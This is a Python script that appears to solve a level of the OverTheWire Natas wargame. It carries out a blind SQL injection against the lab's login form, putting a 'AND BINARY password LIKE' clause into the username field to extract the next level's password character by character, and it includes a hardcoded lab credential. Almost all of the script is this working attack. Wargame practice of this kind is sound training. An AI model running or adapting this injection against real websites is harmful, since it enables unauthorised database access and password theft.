import requests
 
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url = "http://natas15.natas.labs.overthewire.org/"

session = requests.Session()

seen_password = list() 

while True:
    for c in characters:
        print("Tryig with the password: " + "".join(seen_password) + c)
        response = session.post(url, data = {"username": 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + c + "%" + '" #' }, auth=(username, password))
        content = response.text 

        if('user exists' in content):
            seen_password.append(c)
            break 